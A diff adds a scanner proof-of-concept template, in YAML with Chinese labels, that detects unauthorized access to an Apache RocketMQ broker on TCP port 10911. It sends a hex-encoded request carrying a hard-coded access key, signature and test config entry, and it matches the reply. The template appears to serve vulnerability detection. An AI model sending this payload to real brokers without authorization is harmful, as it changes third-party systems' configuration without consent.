@@ -1,0 +1,19 @@
+id: poc-yaml-tcp-apache-rocketmq-broker-unauthorized-access
+info:
+  name: RocketMQ Broker 未授权访问漏洞
+  severity: high
+  tags:
+  - 配置不当
+  finger: rocketmq
+scheme: rocketmq
+port: 10911
+variables:
+  t1: hex_decode("000000c9000000b17b22636f6465223a32352c226578744669656c6473223a7b224163636573734b6579223a22726f636b65746d7132222c225369676e6174757265223a222b7a6452645575617a6953516b4855557164727477673146386a6b3d227d2c22666c6167223a302c226c616e6775616765223a224a415641222c226f7061717565223a302c2273657269616c697a655479706543757272656e74525043223a224a534f4e222c2276657273696f6e223a3433337d746573745f6b65793d746573745f76616c75650a0a")
+tcpRequests:
+- expression:
+  - conn.WriteStr(t1)
+  - conn.ReadStr()
+  - contains(res, "\"serializeTypeCurrentRPC\"") && contains(res, "\"code\":0")
+  - contains(res, "\"opaque\"") && contains(res, "\"version\"")
+  - '!contains(res, "HTTP") && !contains(res, "FTP")'
+transport: tcp
